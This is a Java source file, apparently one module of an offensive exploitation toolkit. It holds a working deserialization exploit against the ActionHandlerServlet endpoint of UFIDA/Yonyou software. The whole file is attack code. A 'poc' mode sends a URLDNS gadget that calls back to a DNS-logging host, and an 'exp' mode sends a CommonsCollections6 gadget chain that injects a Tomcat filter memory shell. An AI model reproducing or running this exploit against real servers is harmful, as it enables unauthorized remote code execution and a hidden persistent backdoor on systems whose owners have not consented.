package com.chave.vuln;

import com.chave.bean.Information;
import com.chave.gadget.CommonsCollections6;
import com.chave.gadget.URLDNS;
import com.chave.proxy.HttpProxy;
import com.chave.utils.MemshellType;
import com.chave.utils.Util;
import com.chave.utils.MemshellClass;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.zip.GZIPOutputStream;

public class ActionHandlerServlet {

    public void exploit(HttpProxy proxy) {
        String vulnerable_url = Information.TARGET + "/servlet/~ic/com.ufida.zior.console.ActionHandlerServlet";
        String[] memshellInfo = new String[]{MemshellType.TomcatFilterMemshellFromThread, MemshellClass.Tomcat7_FilterMemshellFromThread_JDK7};

        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            GZIPOutputStream gzipOS = new GZIPOutputStream(baos);

            // 将数据写入 GZIP 输出流
            if (Information.MOD.equals("poc")) {
                gzipOS.write(Util.getSerializedData(URLDNS.getObject(Information.DNSLOG)));
            } else if (Information.MOD.equals("exp")) {
                gzipOS.write(Util.getSerializedData(CommonsCollections6.getObject(memshellInfo)));
            } else {
                throw new RuntimeException();
            }

            gzipOS.close(); // 关闭流

            //设置全局http代理
            if (proxy.isProxy() == true) {
                String proxyHost = proxy.getHttpProxyHost();
                String proxyPort = proxy.getHttpProxyPort();

                System.setProperty("http.proxyHost", proxyHost);
                System.setProperty("http.proxyPort", proxyPort);
            }

            //发送请求
            URL apiUrl = new URL(vulnerable_url);
            byte[] compressData = baos.toByteArray();
            HttpURLConnection conn = (HttpURLConnection) apiUrl.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);

            // 设置请求头
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("Content-Length", String.valueOf(compressData.length));
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36");

            // 发送压缩文件内容
            try (OutputStream os = conn.getOutputStream()) {
                os.write(compressData);
            }

            // 处理响应
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 请求成功处理
                if (Information.MOD.equals("poc")) {
                    System.out.println("Success. Response code: " + responseCode + "\nPlease check the results on the dnslog platform.");
                } else if (Information.MOD.equals("exp")) {
                    System.out.println("Filter memshell has been injected.\nPlease check if the memshell exists.");
                } else {
                    throw new RuntimeException();
                }

            } else {
                // 请求失败处理
                System.out.println("Failed. Response code: " + responseCode);
            }

            conn.disconnect();
        } catch (Exception e) {
//            e.printStackTrace();
            System.out.println(Information.HELP);
        }


    }
}
